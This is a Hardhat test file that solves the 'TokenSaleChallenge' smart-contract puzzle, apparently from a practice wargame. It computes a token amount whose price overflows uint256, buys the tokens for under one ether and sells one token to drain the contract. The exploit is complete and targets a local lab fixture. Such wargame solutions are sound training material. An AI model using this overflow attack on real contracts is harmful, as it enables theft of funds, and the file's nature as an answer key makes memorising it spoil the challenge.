const { loadFixture } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { fixtureFactory } = require("../utils");
const assert = require('node:assert').strict;

it("Solves TokenSaleChallenge", async function () {
  const fixture = () => fixtureFactory("TokenSaleChallenge", ethers.parseEther("1.0"));
  const contract = await loadFixture(fixture);

  const ONE_ETH = BigInt(10**18);
  const MAX_U256 = BigInt(2**256);
  const numOfTokens = MAX_U256 / ONE_ETH + 1n;
  const amountOfEthSent = numOfTokens * ONE_ETH % MAX_U256;

  assert(amountOfEthSent < ONE_ETH);

  await contract.buy(numOfTokens, {
    value: amountOfEthSent
  });

  await contract.sell(1);
  expect(await contract.isComplete()).to.equal(true);
});